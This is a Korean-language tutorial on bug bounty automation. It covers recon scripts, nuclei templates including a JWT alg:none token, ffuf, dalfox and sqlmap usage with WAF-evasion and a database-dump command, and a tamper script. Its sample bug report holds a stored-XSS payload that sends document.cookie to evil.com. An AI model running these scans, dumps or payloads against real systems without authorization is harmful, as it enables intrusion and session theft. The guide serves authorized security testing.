# 버그바운티 자동화 도구 완전 정복

## 자동화 파이프라인 개요

```
타겟 도메인
    │
    ▼
[정찰 자동화]
subfinder + amass + assetfinder
    │
    ▼
[생존 확인]
httpx + httprobe
    │
    ▼
[스크린샷]
gowitness + eyewitness
    │
    ▼
[취약점 스캔]
nuclei + nikto + dalfox
    │
    ▼
[수동 검증]
Burp Suite + 브라우저
    │
    ▼
[보고서 작성]
```

---

## 1. 정찰 자동화 스크립트

### recon.sh - 종합 정찰 스크립트

```bash
#!/bin/bash
# recon.sh - 버그바운티 자동 정찰 도구

TARGET=$1
OUTPUT_DIR="./recon_$TARGET"
mkdir -p $OUTPUT_DIR/{subdomains,urls,screenshots,nuclei,ports}

echo "[*] 타겟: $TARGET"
echo "[*] 출력 디렉토리: $OUTPUT_DIR"

# ===== 서브도메인 열거 =====
echo "[1/7] 서브도메인 열거 중..."

# 다중 소스 병렬 실행
subfinder -d $TARGET -silent -o $OUTPUT_DIR/subdomains/subfinder.txt &
amass enum -passive -d $TARGET -o $OUTPUT_DIR/subdomains/amass.txt &
assetfinder --subs-only $TARGET > $OUTPUT_DIR/subdomains/assetfinder.txt &
findomain -t $TARGET -q > $OUTPUT_DIR/subdomains/findomain.txt &

# GitHub 서브도메인 (토큰 필요)
# github-subdomains -d $TARGET -t $GITHUB_TOKEN > $OUTPUT_DIR/subdomains/github.txt &

wait

# 중복 제거 및 병합
cat $OUTPUT_DIR/subdomains/*.txt | sort -u > $OUTPUT_DIR/subdomains/all_subdomains.txt
echo "[+] 서브도메인 발견: $(wc -l < $OUTPUT_DIR/subdomains/all_subdomains.txt)개"

# ===== 생존 호스트 확인 =====
echo "[2/7] 생존 호스트 확인 중..."
cat $OUTPUT_DIR/subdomains/all_subdomains.txt | \
    httpx -silent -status-code -title -tech-detect \
          -o $OUTPUT_DIR/subdomains/alive_hosts.txt

echo "[+] 생존 호스트: $(wc -l < $OUTPUT_DIR/subdomains/alive_hosts.txt)개"

# ===== 포트 스캔 =====
echo "[3/7] 포트 스캔 중..."
cat $OUTPUT_DIR/subdomains/all_subdomains.txt | \
    naabu -top-ports 1000 -silent \
          -o $OUTPUT_DIR/ports/open_ports.txt

# ===== URL 수집 =====
echo "[4/7] URL 수집 중..."

# Wayback Machine + CommonCrawl
cat $OUTPUT_DIR/subdomains/all_subdomains.txt | \
    waybackurls > $OUTPUT_DIR/urls/wayback.txt &

cat $OUTPUT_DIR/subdomains/all_subdomains.txt | \
    gau --subs > $OUTPUT_DIR/urls/gau.txt &

# 웹 크롤링
katana -list $OUTPUT_DIR/subdomains/alive_hosts.txt \
       -d 5 -jc -o $OUTPUT_DIR/urls/katana.txt &

wait
cat $OUTPUT_DIR/urls/*.txt | sort -u > $OUTPUT_DIR/urls/all_urls.txt
echo "[+] URL 수집: $(wc -l < $OUTPUT_DIR/urls/all_urls.txt)개"

# ===== 스크린샷 =====
echo "[5/7] 스크린샷 캡처 중..."
gowitness file -f $OUTPUT_DIR/subdomains/alive_hosts.txt \
               -d $OUTPUT_DIR/screenshots/ \
               --screenshot-path $OUTPUT_DIR/screenshots/

# ===== Nuclei 스캔 =====
echo "[6/7] Nuclei 취약점 스캔 중..."
nuclei -list $OUTPUT_DIR/subdomains/alive_hosts.txt \
       -t ~/nuclei-templates/ \
       -severity low,medium,high,critical \
       -o $OUTPUT_DIR/nuclei/results.txt \
       -stats

# ===== JS 파일 분석 =====
echo "[7/7] JS 파일 분석 중..."
cat $OUTPUT_DIR/urls/all_urls.txt | \
    grep "\.js$" | \
    httpx -silent > $OUTPUT_DIR/urls/js_files.txt

# Secrets 탐지
cat $OUTPUT_DIR/urls/js_files.txt | while read url; do
    curl -s "$url" | grep -E "(api_key|apikey|secret|token|password|passwd|aws_)" | \
    head -5 >> $OUTPUT_DIR/urls/js_secrets.txt
done

echo "[완료] 정찰 결과: $OUTPUT_DIR/"
echo "  - 서브도메인: $(wc -l < $OUTPUT_DIR/subdomains/all_subdomains.txt)개"
echo "  - 생존 호스트: $(wc -l < $OUTPUT_DIR/subdomains/alive_hosts.txt)개"
echo "  - URL: $(wc -l < $OUTPUT_DIR/urls/all_urls.txt)개"
echo "  - Nuclei 결과: $(wc -l < $OUTPUT_DIR/nuclei/results.txt)개"
```

---

## 2. Nuclei 고급 활용

### 기본 사용법

```bash
# 특정 타겟 스캔
nuclei -u https://target.com -t nuclei-templates/

# 다중 타겟
nuclei -list targets.txt -t nuclei-templates/

# 심각도별 필터
nuclei -u https://target.com -severity critical,high

# 태그 필터
nuclei -u https://target.com -tags xss,sqli,ssrf

# CVE 스캔
nuclei -u https://target.com -tags cve

# 인증 포함
nuclei -u https://target.com \
       -H "Authorization: Bearer eyJ..." \
       -H "Cookie: session=abc123"

# 속도 제한
nuclei -u https://target.com -rl 10 -bs 5  # 10req/s, 5 bulk

# 출력 형식
nuclei -u https://target.com -j -o results.json  # JSON
nuclei -u https://target.com -markdown-export ./report/
```

### 커스텀 Nuclei 템플릿 작성

```yaml
# custom_idor.yaml - IDOR 탐지 템플릿
id: custom-idor-detection

info:
  name: IDOR via User ID Parameter
  author: bugbounty-hunter
  severity: high
  description: Tests for Insecure Direct Object Reference via id parameter
  tags: idor,generic

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/user?id=1"
      - "{{BaseURL}}/api/user?id=2"
      - "{{BaseURL}}/profile?user_id=1"
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "email"
          - "username"
          - "password"
        condition: or
      - type: dsl
        dsl:
          - "len(body) > 100"
```

```yaml
# jwt_none_alg.yaml - JWT alg:none 탐지
id: jwt-none-algorithm

info:
  name: JWT Algorithm None Vulnerability  
  severity: critical
  tags: jwt,auth

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/protected"
    
    headers:
      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "admin"
          - "protected"
```

```yaml
# exposed_git.yaml - .git 디렉토리 노출
id: exposed-git-directory

info:
  name: Exposed .git Directory
  severity: high
  tags: exposure,git,config

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/HEAD"
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/.git/COMMIT_EDITMSG"

    matchers:
      - type: word
        words:
          - "ref: refs/"
          - "[core]"
          - "repositoryformatversion"
        condition: or
```

### Nuclei 템플릿 라이브러리 관리

```bash
# 템플릿 업데이트
nuclei -update-templates

# 커스텀 템플릿 디렉토리
nuclei -u target.com -t ~/custom-templates/ -t ~/nuclei-templates/

# 템플릿 검색
nuclei -tl | grep "xss"      # XSS 관련 템플릿 목록
nuclei -tl | grep "cve-2023" # 2023년 CVE 목록

# 통계 확인
nuclei -u target.com -stats -silent
```

---

## 3. ffuf 완전 정복

### 디렉토리/파일 퍼징

```bash
# 기본 디렉토리 브루트포스
ffuf -u https://target.com/FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -c -v

# 확장자 퍼징
ffuf -u https://target.com/FUZZ \
     -w wordlist.txt \
     -e .php,.asp,.aspx,.jsp,.txt,.bak \
     -c

# 필터링 (크기/코드별)
ffuf -u https://target.com/FUZZ \
     -w wordlist.txt \
     -fc 404          # 404 제외
     -fs 1234         # 크기 1234 제외
     -fw 10           # 단어 수 10 제외
     -fl 25           # 라인 수 25 제외

# 속도 제한
ffuf -u https://target.com/FUZZ \
     -w wordlist.txt \
     -rate 100        # 초당 100 요청
     -t 50            # 50 스레드
```

### 파라미터 퍼징

```bash
# GET 파라미터 발견
ffuf -u "https://target.com/page?FUZZ=test" \
     -w params.txt \
     -fs 1234         # 기본 응답 크기 필터

# POST 파라미터 퍼징
ffuf -u https://target.com/login \
     -X POST \
     -d "username=admin&FUZZ=test" \
     -w params.txt \
     -H "Content-Type: application/x-www-form-urlencoded"

# JSON 파라미터 퍼징
ffuf -u https://target.com/api \
     -X POST \
     -d '{"FUZZ":"test"}' \
     -H "Content-Type: application/json" \
     -w params.txt

# 다중 위치 퍼징 (CLUSTERBOMB)
ffuf -u "https://target.com/FUZZ1/FUZZ2" \
     -w wordlist1.txt:FUZZ1 \
     -w wordlist2.txt:FUZZ2
```

### Virtual Host 발견

```bash
# 서브도메인/vhost 발견
ffuf -u https://target.com/ \
     -H "Host: FUZZ.target.com" \
     -w subdomains.txt \
     -fs $(curl -s -o /dev/null -w '%{size_download}' https://target.com/)
```

---

## 4. dalfox - XSS 자동화

```bash
# 기본 스캔
dalfox url "https://target.com/search?q=test"

# 파라미터 지정
dalfox url "https://target.com/search?q=test" -p q

# 파이프 입력
echo "https://target.com/search?q=test" | dalfox pipe

# URL 리스트 파일
dalfox file urls.txt

# 헤더 포함
dalfox url "https://target.com/" \
           --cookie "session=abc123" \
           --header "Authorization: Bearer eyJ..."

# Blind XSS (콜백 서버)
dalfox url "https://target.com/search?q=test" \
           -b "https://your-callback.com/xss"

# WAF 우회 모드
dalfox url "https://target.com/search?q=test" \
           --waf-evasion

# 출력 저장
dalfox url "https://target.com/" \
           -o results.txt --format json
```

### dalfox + 파이프라인 연동

```bash
# URL 수집 후 자동 XSS 스캔
cat all_urls.txt | \
    grep "=" | \
    grep -v "\\.css\|\.js\|\.jpg\|\.png" | \
    dalfox pipe --silence

# gau + dalfox 연동
gau target.com | \
    grep "=" | \
    dalfox pipe -b "https://your-xss-hunter.com"
```

---

## 5. SQLMap 고급 활용

```bash
# 기본 스캔
sqlmap -u "https://target.com/page?id=1" --batch

# POST 요청
sqlmap -u "https://target.com/login" \
       --data="username=admin&password=test" \
       --batch

# 쿠키 기반 인젝션
sqlmap -u "https://target.com/page" \
       --cookie="user_id=1; session=abc" \
       -p user_id \
       --batch

# 헤더 기반 인젝션
sqlmap -u "https://target.com/" \
       -H "X-User-ID: 1" \
       -p "X-User-ID" \
       --batch

# WAF 우회 (tamper 스크립트)
sqlmap -u "https://target.com/?id=1" \
       --tamper=space2comment,between,randomcase \
       --batch

# DB 덤프 (허가된 환경)
sqlmap -u "https://target.com/?id=1" \
       --dbs \
       -D webapp \
       --tables \
       -T users \
       --dump \
       --batch

# Burp 요청 파일 사용
sqlmap -r request.txt --batch --level 5 --risk 3

# 시간 기반 SQLi (느린 환경)
sqlmap -u "https://target.com/?id=1" \
       --technique=T \
       --time-sec=10 \
       --batch
```

### SQLMap Tamper 스크립트 커스텀

```python
# custom_tamper.py
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    WAF 우회: 공백을 /**/ 로 변환 + 대소문자 랜덤화
    """
    import random
    
    result = ""
    for char in payload:
        if char == " ":
            result += "/**/"
        elif char.isalpha():
            result += char.upper() if random.random() > 0.5 else char.lower()
        else:
            result += char
    return result
```

---

## 6. 시크릿 탐지 자동화

### GitLeaks

```bash
# 로컬 저장소 스캔
gitleaks detect --source=./repo --report-path=leaks.json

# GitHub 원격 저장소 스캔
gitleaks detect --source=https://github.com/user/repo \
                --report-path=leaks.json

# 커밋 히스토리 스캔
gitleaks detect --source=. --log-opts="HEAD~50..HEAD"

# 커스텀 규칙
gitleaks detect --config=custom_rules.toml
```

```toml
# custom_rules.toml
[extend]
useDefault = true

[[rules]]
id = "custom-api-key"
description = "Custom API Key"
regex = '''(?i)(api_key|apikey|api-key)\s*[:=]\s*['""]?[a-z0-9]{32,}['""]?'''
tags = ["api", "key"]
```

### TruffleHog

```bash
# GitHub 스캔
trufflehog github --repo=https://github.com/user/repo

# 파일시스템 스캔
trufflehog filesystem --path=./code

# S3 버킷 스캔
trufflehog s3 --bucket=my-bucket

# 검증 포함 (실제 유효한 시크릿만)
trufflehog github --repo=... --only-verified
```

---

## 7. 스코프 관리 및 자동화

### scope_manager.py

```python
#!/usr/bin/env python3
"""버그바운티 스코프 관리 도구"""
import re
import json
import subprocess
from pathlib import Path

class ScopeManager:
    def __init__(self, program_name: str):
        self.program = program_name
        self.in_scope = []
        self.out_of_scope = []
        self.targets_file = Path(f"scope_{program_name}.json")
    
    def add_scope(self, domain: str, scope_type: str = "in"):
        """스코프 추가"""
        if scope_type == "in":
            self.in_scope.append(domain)
        else:
            self.out_of_scope.append(domain)
        self._save()
    
    def is_in_scope(self, url: str) -> bool:
        """URL이 스코프 내에 있는지 확인"""
        # Out of scope 먼저 확인
        for oos in self.out_of_scope:
            if oos in url:
                return False
        
        # In scope 확인
        for scope in self.in_scope:
            if "*" in scope:
                pattern = scope.replace(".", r"\.").replace("*", ".*")
                if re.match(pattern, url):
                    return True
            elif scope in url:
                return True
        
        return False
    
    def filter_urls(self, urls_file: str) -> list:
        """URL 파일에서 스코프 내 URL만 추출"""
        filtered = []
        with open(urls_file) as f:
            for url in f:
                url = url.strip()
                if self.is_in_scope(url):
                    filtered.append(url)
        return filtered
    
    def _save(self):
        data = {
            "program": self.program,
            "in_scope": self.in_scope,
            "out_of_scope": self.out_of_scope
        }
        self.targets_file.write_text(json.dumps(data, indent=2))

# 사용 예시
if __name__ == "__main__":
    mgr = ScopeManager("hackerone_target")
    mgr.add_scope("*.target.com", "in")
    mgr.add_scope("api.target.com", "in")
    mgr.add_scope("status.target.com", "out")  # 제외
    
    # URL 필터링
    in_scope_urls = mgr.filter_urls("all_urls.txt")
    print(f"[+] 스코프 내 URL: {len(in_scope_urls)}개")
    
    with open("scoped_urls.txt", "w") as f:
        f.write("\n".join(in_scope_urls))
```

---

## 8. 버그 트리아지 자동화

### auto_triage.py

```python
#!/usr/bin/env python3
"""Nuclei 결과 자동 분류 및 중복 제거"""
import json
from collections import defaultdict

def parse_nuclei_json(filepath: str) -> list:
    results = []
    with open(filepath) as f:
        for line in f:
            try:
                results.append(json.loads(line))
            except json.JSONDecodeError:
                pass
    return results

def deduplicate(results: list) -> list:
    """동일 취약점 중복 제거"""
    seen = set()
    unique = []
    for r in results:
        key = f"{r.get('template-id')}:{r.get('host')}:{r.get('matched-at')}"
        if key not in seen:
            seen.add(key)
            unique.append(r)
    return unique

def triage(results: list) -> dict:
    """심각도별 분류"""
    triaged = defaultdict(list)
    for r in results:
        severity = r.get('info', {}).get('severity', 'info')
        triaged[severity].append({
            'name': r.get('info', {}).get('name'),
            'host': r.get('host'),
            'matched': r.get('matched-at'),
            'curl': r.get('curl-command'),
        })
    return dict(triaged)

def generate_report(triaged: dict):
    """Markdown 보고서 생성"""
    report = "# 자동 취약점 트리아지 보고서\n\n"
    
    for severity in ['critical', 'high', 'medium', 'low', 'info']:
        if severity not in triaged:
            continue
        
        items = triaged[severity]
        emoji = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 
                 'low': '🟢', 'info': '🔵'}.get(severity, '')
        
        report += f"## {emoji} {severity.upper()} ({len(items)}개)\n\n"
        
        for item in items[:10]:  # 상위 10개만
            report += f"### {item['name']}\n"
            report += f"- **호스트:** {item['host']}\n"
            report += f"- **위치:** {item['matched']}\n"
            if item.get('curl'):
                report += f"- **재현:**\n```\n{item['curl']}\n```\n"
            report += "\n"
    
    return report

if __name__ == "__main__":
    results = parse_nuclei_json("nuclei_results.json")
    results = deduplicate(results)
    triaged = triage(results)
    
    report = generate_report(triaged)
    with open("triage_report.md", "w") as f:
        f.write(report)
    
    print(f"[+] 처리 완료:")
    for sev, items in triaged.items():
        print(f"  {sev}: {len(items)}개")
```

---

## 9. 버그바운티 도구 설치 스크립트

```bash
#!/bin/bash
# setup_bugbounty.sh - 버그바운티 도구 일괄 설치

echo "[*] 버그바운티 도구 설치 시작..."

# Go 설치 확인
if ! command -v go &>/dev/null; then
    echo "[-] Go가 필요합니다: https://golang.org/dl/"
    exit 1
fi

# 정찰 도구
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/OWASP/Amass/v3/...@master
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/Findomain/Findomain@latest

# HTTP 프로브
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# 포트 스캔
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# URL 수집
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest

# 디렉토리 브루트포스
go install -v github.com/ffuf/ffuf/v2@latest

# 취약점 스캐너
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# XSS
go install -v github.com/hahwul/dalfox/v2@latest

# 시크릿 탐지
go install -v github.com/gitleaks/gitleaks/v8@latest
pip3 install trufflehog

# JS 분석
go install -v github.com/GerbenJavado/LinkFinder@latest
npm install -g retire  # 취약한 JS 라이브러리 탐지

# 스크린샷
go install -v github.com/sensepost/gowitness@latest

echo "[+] 설치 완료!"
echo "PATH에 ~/go/bin 추가: echo 'export PATH=\$PATH:~/go/bin' >> ~/.bashrc"
```

---

## 10. 보고서 자동 생성

```python
#!/usr/bin/env python3
"""버그 보고서 자동 생성기"""
from datetime import datetime

def generate_report(
    title: str,
    severity: str,
    cvss: float,
    endpoint: str,
    param: str,
    payload: str,
    response: str,
    impact: str,
    steps: list,
    remediation: str
) -> str:
    
    template = f"""# {title}

## 취약점 정보

| 항목 | 내용 |
|------|------|
| **심각도** | {severity} |
| **CVSS 점수** | {cvss} |
| **발견일** | {datetime.now().strftime('%Y-%m-%d')} |
| **상태** | 신규 |

---

## 요약

{title} 취약점이 `{endpoint}` 엔드포인트의 `{param}` 파라미터에서 발견되었습니다.
공격자는 이를 통해 {impact}

---

## 재현 단계

{"".join(f"{i+1}. {step}{chr(10)}" for i, step in enumerate(steps))}

### 요청

```
{payload}
```

### 응답

```
{response}
```

---

## 영향도

{impact}

---

## 수정 권고

{remediation}

---

## 참고 자료

- [OWASP](https://owasp.org)
- [CWE](https://cwe.mitre.org)
"""
    return template

# 사용 예시
if __name__ == "__main__":
    report = generate_report(
        title="Stored XSS via Comment Field",
        severity="High",
        cvss=7.4,
        endpoint="https://target.com/api/comment",
        param="content",
        payload='POST /api/comment\n\ncontent=<script>fetch("https://evil.com?c="+document.cookie)</script>',
        response='HTTP/1.1 200 OK\n{"status":"ok"}',
        impact="피해자 세션 쿠키 탈취, 계정 탈취 가능",
        steps=[
            "공격자 계정으로 로그인",
            "댓글 입력 필드에 XSS 페이로드 입력",
            "관리자가 해당 페이지 방문 시 쿠키 자동 전송",
        ],
        remediation="모든 사용자 입력값에 HTML 이스케이프 적용 (htmlspecialchars), Content-Security-Policy 헤더 설정"
    )
    
    with open("bug_report.md", "w") as f:
        f.write(report)
    print("[+] 보고서 생성: bug_report.md")
```
